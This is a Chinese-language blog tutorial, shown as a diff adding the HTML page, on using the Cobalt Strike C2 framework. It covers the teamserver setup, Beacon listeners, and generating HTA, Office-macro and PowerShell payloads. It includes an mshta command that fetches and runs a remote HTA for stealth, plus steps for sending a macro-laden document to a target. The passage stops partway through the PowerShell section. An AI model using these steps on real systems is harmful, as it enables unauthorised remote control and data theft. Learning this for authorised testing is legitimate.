@@ -1,0 +1,1089 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="在局域网中迅速起一个web服务小技巧迅速在局域网中使用python迅速起一个web服务可以用来快速的下载一个文件 命令： 1python -m http.server  这个命令启用后可以访问到当前运行命令所在目录及其子目录中的文件 然后直接下载 比较方便 拿到shell第一步首先想到的是权限维持 一、CobaltStrike的使用启动服务器：12.&#x2F;teamserver 192.168.0.20">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CobaltStrike的使用">
+<meta property="og:url" content="http://example.com/2024/11/16/CobaltStrike%E7%9A%84%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="ljhflag">
+<meta property="og:description" content="在局域网中迅速起一个web服务小技巧迅速在局域网中使用python迅速起一个web服务可以用来快速的下载一个文件 命令： 1python -m http.server  这个命令启用后可以访问到当前运行命令所在目录及其子目录中的文件 然后直接下载 比较方便 拿到shell第一步首先想到的是权限维持 一、CobaltStrike的使用启动服务器：12.&#x2F;teamserver 192.168.0.20">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191524924.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191524048.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191742086.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191742740.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411202006854.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411211949669.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212233398.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212051506.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212051460.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212154480.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212227959.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221624470.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221625593.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221626871.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221626946.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221630163.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221631797.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221656292.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221819589.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411271113430.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411271756983.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282147356.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282213334.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282215105.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041118860.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041119326.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041549607.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041655111.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041655579.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041801175.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041803656.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051338507.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051339686.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051340342.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041828533.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041830218.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041841672.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041854185.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041855111.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015300.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015958.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015642.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042017957.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082115649.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082116453.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082121928.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082121964.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082108577.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051619929.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051619047.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082125252.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502091050307.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502091053201.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051654469.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082126934.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111332584.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111338642.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111403565.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111408402.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111410949.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111353588.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111452708.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111452529.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111504867.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111504155.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162012236.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162012679.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502162140024.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182037898.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182042377.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502182110235.png">
+<meta property="article:published_time" content="2024-11-16T08:27:00.000Z">
+<meta property="article:modified_time" content="2025-02-19T14:26:36.791Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191524924.png">
+  
+  
+  
+  <title>CobaltStrike的使用 - ljhflag</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"skSyD5RSTq4kiWeAhMeeY9ib-gzGzoHsz","app_key":"rQPg4V1fSy3hOP8QAyeJnyh8","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ljhflag</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CobaltStrike的使用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-16 16:27" pubdate>
+          2024年11月16日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          57 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CobaltStrike的使用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="在局域网中迅速起一个web服务小技巧"><a href="#在局域网中迅速起一个web服务小技巧" class="headerlink" title="在局域网中迅速起一个web服务小技巧"></a>在局域网中迅速起一个web服务小技巧</h1><p>迅速在局域网中使用python迅速起一个web服务可以用来快速的下载一个文件</p>
+<p>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server<br></code></pre></td></tr></table></figure>
+
+<p>这个命令启用后可以访问到当前运行命令所在目录及其子目录中的文件 然后直接下载 比较方便</p>
+<p>拿到shell第一步首先想到的是权限维持</p>
+<h1 id="一、CobaltStrike的使用"><a href="#一、CobaltStrike的使用" class="headerlink" title="一、CobaltStrike的使用"></a>一、CobaltStrike的使用</h1><h2 id="启动服务器："><a href="#启动服务器：" class="headerlink" title="启动服务器："></a>启动服务器：</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">./teamserver 192.168.0.204[服务端ip] 123@asd  [客户端连接服务短所需要的连接密码] <br>nohub ./teamserver 192.168.0.204[服务端ip] 123@asd  [后台运行进程]<br></code></pre></td></tr></table></figure>
+
+<p>启动默认端口是50050如果需要更改可以改服务端文件中的teamserver文件中的内容如图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191524924.png" srcset="/img/loading.gif" lazyload alt="image-20241119152414674"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191524048.png" srcset="/img/loading.gif" lazyload alt="image-20241119152417881"></p>
+<h2 id="cs控制端-C2服务器-目标攻击主机之间的关系"><a href="#cs控制端-C2服务器-目标攻击主机之间的关系" class="headerlink" title="cs控制端-C2服务器-目标攻击主机之间的关系"></a>cs控制端-C2服务器-目标攻击主机之间的关系</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">攻击者操作端（CS GUI）  <br>    ↕ <span class="hljs-comment">(命令管理与控制)</span><br>Cobalt Strike Team Server（C<span class="hljs-number">2</span> 服务器）  <br>    ↕ <span class="hljs-comment">(通信伪装: HTTP/HTTPS/DNS/SMB)</span><br>目标主机（被感染设备）  <br></code></pre></td></tr></table></figure>
+
+<h1 id="二、CS创建攻击Attacks"><a href="#二、CS创建攻击Attacks" class="headerlink" title="二、CS创建攻击Attacks"></a>二、CS创建攻击Attacks</h1><h2 id="CS创建监听器"><a href="#CS创建监听器" class="headerlink" title="CS创建监听器"></a>CS创建监听器</h2><p>CobaltStrike的内置监听器叫Beacon，外置监听器叫Foreign。cs的Beacon支持异步通信和交互式通信。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.异步通信是一种非实时通信方式，发送方和接收方的交互时间没有严格同步的要求。发送方发送消息后，不需要等待接收方的即时响应，接收方可以在稍后的时间处理消息。<br>2.交互式通信是一种实时通信方式，发送方和接收方在同一时间范围内进行通信。发送方发送消息后，通常需要立即收到接收方的响应，才能继续下一步操作。<br></code></pre></td></tr></table></figure>
+
+<p>创建监听器的步骤： </p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191742086.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-19 173946"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411191742740.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-19 174012"></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">在上图中：<br>name：为监听器的名字<br>payload：为payload的类型<br>HTTP Hosts：shell反弹的主机，也就是我们kali的ip<br>HTTP <span class="hljs-built_in">Hosts</span>(Stager)：Stager的马请求下载payload的地址<br>HTTP <span class="hljs-built_in">Port</span>(C2)：C2监听的端口<br></code></pre></td></tr></table></figure>
+
+<h3 id="Beacon的基本工作原理"><a href="#Beacon的基本工作原理" class="headerlink" title="Beacon的基本工作原理"></a>Beacon的基本工作原理</h3><p><strong>Beacon</strong> 它是一个 <strong>长期存在的</strong> 反向连接代理，它允许攻击者在目标系统上执行命令、窃取数据、横向移动等操作。Beacon 一般会在目标主机上持续运行，并周期性地与 C2 服务器通信以接收命令。[<strong>其中的反向代理连接是目标主机主动去连接到c2服务器上</strong>]</p>
+<p><strong>Stager</strong> 是攻击过程中的一个初步阶段，通常指的是一种 <strong>小型的载荷</strong>，它的任务是<strong>从目标主机启动并下载&#x2F;执行更复杂的 payload（比如 Beacon）</strong>。</p>
+<p><strong>Beacon 的通信流程</strong></p>
+<ol>
+<li><strong>部署</strong>：<ul>
+<li>攻击者通过社工攻击、漏洞利用等方式在目标系统上部署 Beacon 或 Stager。</li>
+</ul>
+</li>
+<li><strong>连接 C2</strong>：<ul>
+<li>Beacon 启动后，会根据 Listener 配置尝试与 C2 地址（HTTP Hosts）建立通信。</li>
+<li>具体端口和请求行为由 Profile 决定。</li>
+</ul>
+</li>
+<li><strong>接收指令</strong>：<ul>
+<li>C2 会向 Beacon 发送任务指令（如执行命令、收集信息、横向移动等）。</li>
+</ul>
+</li>
+<li><strong>数据上传</strong>：<ul>
+<li>Beacon 收集到目标系统的信息后，将其加密并通过 HTTP POST 上传至 C2。</li>
+</ul>
+</li>
+<li><strong>持久性</strong>：<ul>
+<li>Beacon 可以通过定时通信（Sleep Interval）保持低频率活动，减少被检测的风险。</li>
+</ul>
+</li>
+</ol>
+<h2 id="创建攻击Attacks（生成后门）"><a href="#创建攻击Attacks（生成后门）" class="headerlink" title="创建攻击Attacks（生成后门）"></a>创建攻击Attacks（生成后门）</h2><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411202006854.png" srcset="/img/loading.gif" lazyload alt="image-20241120200609719"></p>
+<h2 id="Attacks种类以及使用"><a href="#Attacks种类以及使用" class="headerlink" title="Attacks种类以及使用"></a>Attacks种类以及使用</h2><p><strong>HTA文档：</strong>生成一个恶意HTML Application木马，后缀格式为.hta。通过HTML调用其他语言的应用组件进行攻击，提供了可执行文件 、PowerShell、VBA三种方法。</p>
+<p><strong>office宏：</strong>生成office宏病毒文件;[用的不多大部分已失效，因为目前国内的office或者WPS中默认将宏关闭]</p>
+<p><strong>Payload生成器：</strong>生成各种语言版本的payload，可以生成基于C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA等的payload</p>
+<p><strong>Windows可执行程序：</strong>生成32位或64位的exe和基于服务的exe、DLL等后门程序</p>
+<p><strong>Windows Executable(S)：</strong>用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存</p>
+<h3 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h3><h4 id="HTA文档："><a href="#HTA文档：" class="headerlink" title="HTA文档："></a>HTA文档：<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411211949669.png" srcset="/img/loading.gif" lazyload alt="image-20241121194903569"></h4><p>在选择使用哪种方式生成hta文件的时候是根据目标主机的环境所决定的。如果环境不合适可能会导致脚本执行错误。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212233398.png" srcset="/img/loading.gif" lazyload alt="image-20241121223319354"></p>
+<h4 id="上线步骤："><a href="#上线步骤：" class="headerlink" title="上线步骤："></a>上线步骤：</h4><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212051506.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-21 194205"></p>
+<p>生成hat文件后将其部署到c2服务器上[原因：可以]</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212051460.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-21 200609"></p>
+<p>然后在目标主机上使用命令：mshta <a target="_blank" rel="noopener" href="http://192.168.6.127/file.ext">http://192.168.6.127:80/file.ext</a>  至于为什么使用这个命令而不是直接下载hta文件是因为这样的隐蔽性更高一点</p>
+<p>mshta是win上自带的专门用于运行 HTML 应用程序的工具，它直接解析文件内容，而不会考虑文件扩展名；这也是为什么如果直接访问<a target="_blank" rel="noopener" href="http://192.168.6.127/file.ext%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AFext%E6%96%87%E4%BB%B6%E4%BD%86%E6%98%AF%E5%A6%82%E6%9E%9C%E4%BD%BF%E7%94%A8mshta%E6%9D%A5%E8%AE%BF%E9%97%AE%E5%8D%B4%E4%BC%9A%E6%8C%89%E7%85%A7hat%E6%96%87%E4%BB%B6%E5%8E%BB%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8E%9F%E5%9B%A0">http://192.168.6.127:80/file.ext浏览器下载的是ext文件但是如果使用mshta来访问却会按照hat文件去执行的原因</a></p>
+<p>如果直接通过url去访问会下载文件file.ext浏览器会根据文件扩展名来下载文件导致下载下来的文件为file.ext</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212154480.png" srcset="/img/loading.gif" lazyload alt="image-20241121215440313"></p>
+<p>成功上线：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212227959.png" srcset="/img/loading.gif" lazyload alt="image-20241121222748891"></p>
+<h4 id="office宏：-使用较少"><a href="#office宏：-使用较少" class="headerlink" title="office宏：(使用较少)"></a><strong>office宏：</strong>(使用较少)</h4><p>[生效前提：WPS或者world的禁用宏关掉]</p>
+<p>是通过设成office宏病毒文件，当目标主机接收到这个文件并且他的world或者wps没有禁用宏  如果目标主机打开这个文件目标主机就会上线。</p>
+<h4 id="上线步骤：-1"><a href="#上线步骤：-1" class="headerlink" title="上线步骤："></a>上线步骤：</h4><p>直接点击office宏然后选择监听的目标主机即可</p>
+<p>然后点击Copy Macro</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221624470.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-22 155137"></p>
+<p>然后点点击视图创建一个宏</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221625593.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-22 155243"></p>
+<p>自定义一个宏的名字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221626871.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-22 155640"></p>
+<p>将之前Copy的宏复制到里面并保存</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221626946.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-22 155358"></p>
+<p>然后将这个world文档发送给目标主机</p>
+<p>当目标主机打开这个文件时 cs显示成功上线</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221630163.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-22 161120"></p>
+<p>但是注意；成功上线的前提是要先把WPS或者world的禁用宏关掉</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221631797.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2024-11-22 155516"></p>
+<h4 id="Payload生成器："><a href="#Payload生成器：" class="headerlink" title="Payload生成器："></a>Payload生成器：</h4><p>这个模块用于生成各个语言版本的shellcode，然后使用其他语言进行编译生成[<strong>生成的shellcode可以嵌入到其他语言的程序中进行封装和利用</strong>。]</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221656292.png" srcset="/img/loading.gif" lazyload alt="image-20241122165619216"></p>
+<p>这里主要说两个payload：Powershell和Powershell Command。两个都是利用Powershell进行上线。[一个是执行完整的powershell脚本一个是执行powershell命令]</p>
+<h4 id="上线步骤：-2"><a href="#上线步骤：-2" class="headerlink" title="上线步骤："></a>上线步骤：</h4><h5 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h5><p>执行方式  在powershell下：[有的PowerShell 的 <strong>执行策略</strong>会限制脚本的运行]</p>
